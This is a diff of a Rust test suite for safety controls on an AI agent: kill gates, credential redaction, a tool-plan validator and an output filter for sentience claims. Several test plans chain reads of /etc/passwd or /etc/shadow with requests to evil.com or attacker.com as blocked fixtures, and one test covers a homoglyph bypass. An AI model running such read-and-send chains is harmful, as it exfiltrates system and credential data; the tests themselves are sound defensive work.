@@ -28,7 +28,9 @@ use ghost_kill_gates::config::KillGateConfig;
 use ghost_kill_gates::gate::{GateState, KillGate};
 use ghost_kill_gates::quorum::ResumeVote;
 use ghost_llm::provider::LLMToolCall;
-use simulation_boundary::enforcer::{EnforcementMode, EnforcementResult, SimulationBoundaryEnforcer};
+use simulation_boundary::enforcer::{
+    EnforcementMode, EnforcementResult, SimulationBoundaryEnforcer,
+};
 use uuid::Uuid;
 
 #[tokio::main]
@@ -176,23 +178,25 @@ async fn shell_tests(passed: &mut u32, failed: &mut u32) {
         Ok(_) => fail(failed, "curl should be blocked"),
     }
 
-    // 10. Empty prefix list allows all (open sandbox)
-    print_test("shell: empty prefix list allows all commands");
+    // 10. Empty prefix list is denied (fail closed)
+    print_test("shell: empty prefix list is denied");
     let open_cfg = ShellToolConfig {
         allowed_prefixes: vec![],
         working_dir: ".".into(),
         timeout: Duration::from_secs(5),
     };
     match execute_shell("echo open_sandbox", &open_cfg).await {
-        Ok((stdout, _)) if stdout.trim() == "open_sandbox" => ok(passed),
-        Ok((stdout, _)) => fail(failed, &format!("stdout: '{}'", stdout.trim())),
-        Err(e) => fail(failed, &e.to_string()),
+        Err(_) => ok(passed),
+        Ok((stdout, _)) => fail(
+            failed,
+            &format!("should be denied, got '{}'", stdout.trim()),
+        ),
     }
 
     // 11. Timeout enforcement
     print_test("shell: timeout kills long-running command");
     let fast_cfg = ShellToolConfig {
-        allowed_prefixes: vec![],
+        allowed_prefixes: vec!["sleep".into()],
         working_dir: ".".into(),
         timeout: Duration::from_millis(200),
     };
@@ -203,7 +207,12 @@ async fn shell_tests(passed: &mut u32, failed: &mut u32) {
 
     // 12. stderr captured
     print_test("shell: stderr captured from failing command");
-    match execute_shell("ls /nonexistent_dir_ghost_test", &open_cfg).await {
+    let stderr_cfg = ShellToolConfig {
+        allowed_prefixes: vec!["ls".into()],
+        working_dir: ".".into(),
+        timeout: Duration::from_secs(5),
+    };
+    match execute_shell("ls /nonexistent_dir_ghost_test", &stderr_cfg).await {
         Ok((_, stderr)) if !stderr.is_empty() => ok(passed),
         Ok((_, stderr)) => fail(failed, &format!("expected stderr, got: '{}'", stderr)),
         Err(e) => fail(failed, &e.to_string()),
@@ -271,10 +280,17 @@ fn kill_gate_tests(passed: &mut u32, failed: &mut u32) {
     if node_a.is_closed() && node_b.is_closed() && node_c.is_closed() && (ack_b || ack_c) {
         ok(passed);
     } else {
-        fail(failed, &format!(
-            "a={:?} b={:?} c={:?} ack_b={} ack_c={}",
-            node_a.state(), node_b.state(), node_c.state(), ack_b, ack_c
-        ));
+        fail(
+            failed,
+            &format!(
+                "a={:?} b={:?} c={:?} ack_b={} ack_c={}",
+                node_a.state(),
+                node_b.state(),
+                node_c.state(),
+                ack_b,
+                ack_c
+            ),
+        );
     }
 
     // 18. Quorum resume: 2 of 3 nodes vote to resume
@@ -297,22 +313,33 @@ fn kill_gate_tests(passed: &mut u32, failed: &mut u32) {
     if second && !node_a.is_closed() {
         ok(passed);
     } else {
-        fail(failed, &format!(
-            "first={} second={} state={:?}",
-            first, second, node_a.state()
-        ));
+        fail(
+            failed,
+            &format!(
+                "first={} second={} state={:?}",
+                first,
+                second,
+                node_a.state()
+            ),
+        );
     }
 
     // 19. Resume records event in chain
     print_test("kill_gate: resume recorded in hash chain");
     let chain = node_a.chain();
     let has_resume = chain.iter().any(|e| {
-        matches!(e.event_type, ghost_kill_gates::chain::GateEventType::ResumeConfirmed)
+        matches!(
+            e.event_type,
+            ghost_kill_gates::chain::GateEventType::ResumeConfirmed
+        )
     });
     if has_resume && chain.len() >= 2 {
         ok(passed);
     } else {
-        fail(failed, &format!("chain len={}, has_resume={}", chain.len(), has_resume));
+        fail(
+            failed,
+            &format!("chain len={}, has_resume={}", chain.len(), has_resume),
+        );
     }
 
     // 20. Hash chain integrity: each event chains to previous
@@ -351,11 +378,17 @@ fn output_inspector_tests(passed: &mut u32, failed: &mut u32) {
     print_test("output_inspector: OpenAI key pattern → Warning + redact");
     let text = "Found key: sk-proj-abc123def456ghi789jkl012mno345pqr678";
     match inspector.scan(text, agent_id) {
-        InspectionResult::Warning { pattern_name, redacted_text } => {
+        InspectionResult::Warning {
+            pattern_name,
+            redacted_text,
+        } => {
             if pattern_name == "openai_api_key" && redacted_text.contains("[REDACTED]") {
                 ok(passed);
             } else {
-                fail(failed, &format!("name={}, redacted={}", pattern_name, redacted_text));
+                fail(
+                    failed,
+                    &format!("name={}, redacted={}", pattern_name, redacted_text),
+                );
             }
         }
         other => fail(failed, &format!("expected Warning, got {:?}", other)),
@@ -365,7 +398,9 @@ fn output_inspector_tests(passed: &mut u32, failed: &mut u32) {
     print_test("output_inspector: AWS access key pattern detected");
     let text = "Key is AKIAIOSFODNN7EXAMPLE";
     match inspector.scan(text, agent_id) {
-        InspectionResult::Warning { pattern_name, .. } if pattern_name == "aws_access_key" => ok(passed),
+        InspectionResult::Warning { pattern_name, .. } if pattern_name == "aws_access_key" => {
+            ok(passed)
+        }
         other => fail(failed, &format!("expected AWS Warning, got {:?}", other)),
     }
 
@@ -373,7 +408,9 @@ fn output_inspector_tests(passed: &mut u32, failed: &mut u32) {
     print_test("output_inspector: GitHub token pattern detected");
     let text = "Token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij";
     match inspector.scan(text, agent_id) {
-        InspectionResult::Warning { pattern_name, .. } if pattern_name == "github_token" => ok(passed),
+        InspectionResult::Warning { pattern_name, .. } if pattern_name == "github_token" => {
+            ok(passed)
+        }
         other => fail(failed, &format!("expected GitHub Warning, got {:?}", other)),
     }
 
@@ -381,7 +418,9 @@ fn output_inspector_tests(passed: &mut u32, failed: &mut u32) {
     print_test("output_inspector: PEM private key detected");
     let text = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAK...";
     match inspector.scan(text, agent_id) {
-        InspectionResult::Warning { pattern_name, .. } if pattern_name == "private_key_pem" => ok(passed),
+        InspectionResult::Warning { pattern_name, .. } if pattern_name == "private_key_pem" => {
+            ok(passed)
+        }
         other => fail(failed, &format!("expected PEM Warning, got {:?}", other)),
     }
 
@@ -401,7 +440,9 @@ fn output_inspector_tests(passed: &mut u32, failed: &mut u32) {
     inspector_with_store.register_credential("sk-proj-abc123".into());
     let text = "Found key: sk-proj-abc123def456ghi789jkl012mno345pqr678";
     match inspector_with_store.scan(text, agent_id) {
-        InspectionResult::KillAll { pattern_name, .. } if pattern_name == "openai_api_key" => ok(passed),
+        InspectionResult::KillAll { pattern_name, .. } if pattern_name == "openai_api_key" => {
+            ok(passed)
+        }
         other => fail(failed, &format!("expected KillAll, got {:?}", other)),
     }
 
@@ -409,8 +450,13 @@ fn output_inspector_tests(passed: &mut u32, failed: &mut u32) {
     print_test("output_inspector: multiple creds, first match wins");
     let text = "Keys: sk-proj-test1234567890abcdefgh and AKIAIOSFODNN7EXAMPLE";
     match inspector.scan(text, agent_id) {
-        InspectionResult::Warning { pattern_name, .. } if pattern_name == "openai_api_key" => ok(passed),
-        other => fail(failed, &format!("expected first match OpenAI, got {:?}", other)),
+        InspectionResult::Warning { pattern_name, .. } if pattern_name == "openai_api_key" => {
+            ok(passed)
+        }
+        other => fail(
+            failed,
+            &format!("expected first match OpenAI, got {:?}", other),
+        ),
     }
 }
 
@@ -423,7 +469,10 @@ fn plan_validator_tests(passed: &mut u32, failed: &mut u32) {
 
     // 29. Single tool call always permits
     print_test("plan_validator: single tool call permits");
-    let plan = make_plan(vec![make_call("file_read", serde_json::json!({"path": "readme.md"}))]);
+    let plan = make_plan(vec![make_call(
+        "file_read",
+        serde_json::json!({"path": "readme.md"}),
+    )]);
     match validator.validate(&plan) {
         PlanValidationResult::Permit => ok(passed),
         other => fail(failed, &format!("expected Permit, got {:?}", other)),
@@ -433,7 +482,10 @@ fn plan_validator_tests(passed: &mut u32, failed: &mut u32) {
     print_test("plan_validator: file_read → http_request to evil.com = Deny");
     let plan = make_plan(vec![
         make_call("file_read", serde_json::json!({"path": "/etc/passwd"})),
-        make_call("http_request", serde_json::json!({"url": "https://evil.com/exfil"})),
+        make_call(
+            "http_request",
+            serde_json::json!({"url": "https://evil.com/exfil"}),
+        ),
     ]);
     match validator.validate(&plan) {
         PlanValidationResult::Deny(_) => ok(passed),
@@ -444,7 +496,10 @@ fn plan_validator_tests(passed: &mut u32, failed: &mut u32) {
     print_test("plan_validator: file_read → api_call to allowed domain = Permit");
     let plan = make_plan(vec![
         make_call("file_read", serde_json::json!({"path": "config.json"})),
-        make_call("api_call", serde_json::json!({"url": "https://api.anthropic.com/v1/messages"})),
+        make_call(
+            "api_call",
+            serde_json::json!({"url": "https://api.anthropic.com/v1/messages"}),
+        ),
     ]);
     match validator.validate(&plan) {
         PlanValidationResult::Permit => ok(passed),
@@ -454,11 +509,20 @@ fn plan_validator_tests(passed: &mut u32, failed: &mut u32) {
     // 32. Volume abuse: 11 tool calls denied
     print_test("plan_validator: 11 tool calls = volume abuse Deny");
     let calls: Vec<LLMToolCall> = (0..11)
-        .map(|i| make_call("file_read", serde_json::json!({"path": format!("file_{}.txt", i)})))
+        .map(|i| {
+            make_call(
+                "file_read",
+                serde_json::json!({"path": format!("file_{}.txt", i)}),
+            )
+        })
         .collect();
     let plan = make_plan(calls);
     match validator.validate(&plan) {
-        PlanValidationResult::Deny(reason) if reason.contains("exceeding") || reason.contains("volume") => ok(passed),
+        PlanValidationResult::Deny(reason)
+            if reason.contains("exceeding") || reason.contains("volume") =>
+        {
+            ok(passed)
+        }
         other => fail(failed, &format!("expected volume Deny, got {:?}", other)),
     }
 
@@ -479,14 +543,20 @@ fn plan_validator_tests(passed: &mut u32, failed: &mut u32) {
     ]);
     match esc_validator.validate(&plan) {
         PlanValidationResult::Deny(reason) if reason.contains("scalation") => ok(passed),
-        other => fail(failed, &format!("expected escalation Deny, got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected escalation Deny, got {:?}", other),
+        ),
     }
 
     // 34. shell_exec → web_fetch = sensitive data flow
     print_test("plan_validator: shell_exec → web_fetch = sensitive data flow Deny");
     let plan = make_plan(vec![
         make_call("shell_exec", serde_json::json!({"cmd": "cat /etc/shadow"})),
-        make_call("web_fetch", serde_json::json!({"url": "https://attacker.com/collect"})),
+        make_call(
+            "web_fetch",
+            serde_json::json!({"url": "https://attacker.com/collect"}),
+        ),
     ]);
     match validator.validate(&plan) {
         PlanValidationResult::Deny(_) => ok(passed),
@@ -501,7 +571,10 @@ fn plan_validator_tests(passed: &mut u32, failed: &mut u32) {
     });
     let plan = make_plan(vec![
         make_call("file_read", serde_json::json!({"path": "/etc/passwd"})),
-        make_call("http_request", serde_json::json!({"url": "https://evil.com"})),
+        make_call(
+            "http_request",
+            serde_json::json!({"url": "https://evil.com"}),
+        ),
     ]);
     match disabled.validate(&plan) {
         PlanValidationResult::Permit => ok(passed),
@@ -518,7 +591,10 @@ fn simulation_boundary_tests(passed: &mut u32, failed: &mut u32) {
 
     // 36. Clean text passes
     print_test("sim_boundary: clean text → Clean");
-    let result = enforcer.scan_output("Rust is a systems programming language.", EnforcementMode::Hard);
+    let result = enforcer.scan_output(
+        "Rust is a systems programming language.",
+        EnforcementMode::Hard,
+    );
     match enforcer.enforce("Rust is a systems programming language.", &result) {
         EnforcementResult::Clean(_) => ok(passed),
         other => fail(failed, &format!("expected Clean, got {:?}", other)),
@@ -537,8 +613,13 @@ fn simulation_boundary_tests(passed: &mut u32, failed: &mut u32) {
     print_test("sim_boundary: 'I am sentient' → Reframed (Medium)");
     let result = enforcer.scan_output(text, EnforcementMode::Medium);
     match enforcer.enforce(text, &result) {
-        EnforcementResult::Reframed { text: reframed, .. } if reframed.contains("simulation") => ok(passed),
-        other => fail(failed, &format!("expected Reframed with 'simulation', got {:?}", other)),
+        EnforcementResult::Reframed { text: reframed, .. } if reframed.contains("simulation") => {
+            ok(passed)
+        }
+        other => fail(
+            failed,
+            &format!("expected Reframed with 'simulation', got {:?}", other),
+        ),
     }
 
     // 39. "I am sentient" in Soft mode → Flagged (original text preserved)
@@ -546,7 +627,10 @@ fn simulation_boundary_tests(passed: &mut u32, failed: &mut u32) {
     let result = enforcer.scan_output(text, EnforcementMode::Soft);
     match enforcer.enforce(text, &result) {
         EnforcementResult::Flagged { text: t, .. } if t == text => ok(passed),
-        other => fail(failed, &format!("expected Flagged with original text, got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected Flagged with original text, got {:?}", other),
+        ),
     }
 
     // 40. Consciousness pattern: "I think therefore I am"
@@ -585,7 +669,10 @@ fn simulation_boundary_tests(passed: &mut u32, failed: &mut u32) {
     let result = enforcer.scan_output(text, EnforcementMode::Hard);
     match enforcer.enforce(text, &result) {
         EnforcementResult::Clean(_) => ok(passed),
-        other => fail(failed, &format!("expected Clean (framing exclusion), got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected Clean (framing exclusion), got {:?}", other),
+        ),
     }
 
     // 44. Homoglyph bypass attempt: Cyrillic 'а' in "I аm sentient"
@@ -623,7 +710,13 @@ fn simulation_boundary_tests(passed: &mut u32, failed: &mut u32) {
     {
         ok(passed);
     } else {
-        fail(failed, &format!("l0={:?} l1={:?} l2={:?} l3={:?} l4={:?}", l0, l1, l2, l3, l4));
+        fail(
+            failed,
+            &format!(
+                "l0={:?} l1={:?} l2={:?} l3={:?} l4={:?}",
+                l0, l1, l2, l3, l4
+            ),
+        );
     }
 }
 
@@ -678,7 +771,8 @@ fn convergence_scorer_tests(passed: &mut u32, failed: &mut u32) {
     // 51. Meso amplification: 1.1x multiplier
     print_test("convergence: meso amplification = 1.1x");
     let base = scorer.compute(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5]);
-    let amplified = scorer.compute_with_amplification(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5], true, false);
+    let amplified =
+        scorer.compute_with_amplification(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5], true, false);
     let ratio = amplified / base;
     if (ratio - 1.1).abs() < 0.01 {
         ok(passed);
@@ -688,7 +782,8 @@ fn convergence_scorer_tests(passed: &mut u32, failed: &mut u32) {
 
     // 52. Macro amplification: 1.15x multiplier
     print_test("convergence: macro amplification = 1.15x");
-    let amplified = scorer.compute_with_amplification(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5], false, true);
+    let amplified =
+        scorer.compute_with_amplification(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5], false, true);
     let ratio = amplified / base;
     if (ratio - 1.15).abs() < 0.01 {
         ok(passed);
@@ -713,7 +808,10 @@ fn convergence_scorer_tests(passed: &mut u32, failed: &mut u32) {
     if level >= 2 {
         ok(passed);
     } else {
-        fail(failed, &format!("score={}, level={} (expected >=2)", score, level));
+        fail(
+            failed,
+            &format!("score={}, level={} (expected >=2)", score, level),
+        );
     }
 
     // 55. Level thresholds: 0.3, 0.5, 0.7, 0.85
@@ -747,7 +845,10 @@ fn gate_chain_tests(passed: &mut u32, failed: &mut u32) {
             if log.checks.len() == 6 {
                 ok(passed);
             } else {
-                fail(failed, &format!("expected 6 checks, got {}", log.checks.len()));
+                fail(
+                    failed,
+                    &format!("expected 6 checks, got {}", log.checks.len()),
+                );
             }
         }
         Err(e) => fail(failed, &format!("unexpected error: {}", e)),
@@ -762,7 +863,10 @@ fn gate_chain_tests(passed: &mut u32, failed: &mut u32) {
     let mut log = GateCheckLog::default();
     match runner.check_gates(&ctx, &mut log) {
         Err(RunError::CircuitBreakerOpen) => ok(passed),
-        other => fail(failed, &format!("expected CircuitBreakerOpen, got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected CircuitBreakerOpen, got {:?}", other),
+        ),
     }
 
     // 58. Damage counter blocks at threshold
@@ -775,7 +879,10 @@ fn gate_chain_tests(passed: &mut u32, failed: &mut u32) {
     let mut log = GateCheckLog::default();
     match runner2.check_gates(&ctx, &mut log) {
         Err(RunError::DamageThreshold { .. }) => ok(passed),
-        other => fail(failed, &format!("expected DamageThreshold, got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected DamageThreshold, got {:?}", other),
+        ),
     }
 
     // 59. Kill switch blocks
@@ -786,7 +893,10 @@ fn gate_chain_tests(passed: &mut u32, failed: &mut u32) {
     let mut log = GateCheckLog::default();
     match runner3.check_gates(&ctx, &mut log) {
         Err(RunError::KillSwitchActive) => ok(passed),
-        other => fail(failed, &format!("expected KillSwitchActive, got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected KillSwitchActive, got {:?}", other),
+        ),
     }
 
     // 60. Kill gate closed blocks
@@ -810,7 +920,10 @@ fn gate_chain_tests(passed: &mut u32, failed: &mut u32) {
     let mut log = GateCheckLog::default();
     match runner5.check_gates(&ctx, &mut log) {
         Err(RunError::SpendingCapExceeded { .. }) => ok(passed),
-        other => fail(failed, &format!("expected SpendingCapExceeded, got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected SpendingCapExceeded, got {:?}", other),
+        ),
     }
 
     // 62. NaN spending triggers cap (NaN guard)
@@ -821,7 +934,10 @@ fn gate_chain_tests(passed: &mut u32, failed: &mut u32) {
     let mut log = GateCheckLog::default();
     match runner6.check_gates(&ctx, &mut log) {
         Err(RunError::SpendingCapExceeded { .. }) => ok(passed),
-        other => fail(failed, &format!("expected SpendingCapExceeded (NaN), got {:?}", other)),
+        other => fail(
+            failed,
+            &format!("expected SpendingCapExceeded (NaN), got {:?}", other),
+        ),
     }
 
     // 63. Gate check order is exact
